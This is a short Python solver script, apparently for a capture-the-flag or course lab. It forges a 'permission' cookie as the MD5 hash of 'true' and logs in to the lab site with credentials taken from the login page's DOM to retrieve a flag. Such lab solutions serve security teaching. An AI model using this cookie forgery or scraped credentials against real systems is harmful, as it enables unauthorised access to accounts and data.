import sys
from pathlib import Path
sys.path.append(str(Path(__file__).resolve().parent.parent))
from utils import get_session, find_flag

import hashlib

BASE_URL = "https://shattered.quoccacorp.com"

class Solver:
    def __init__(self):
        self.session = get_session()

    def text_to_md5(self, text: str):
        md5_hash = hashlib.md5(text.encode())
        return md5_hash.hexdigest()

    def main(self):
        # print(self.session.cookies.get("permission")) # false
        self.session.cookies.set("permission", self.text_to_md5("true"))

        response = self.session.post(f"{BASE_URL}/login", data={
            "username": "francis", # Credentials found in DOM of https://shattered.quoccacorp.com/login
            "password": "mansfield"
        })
        find_flag(response.text)

if __name__ == "__main__":
    Solver().main()
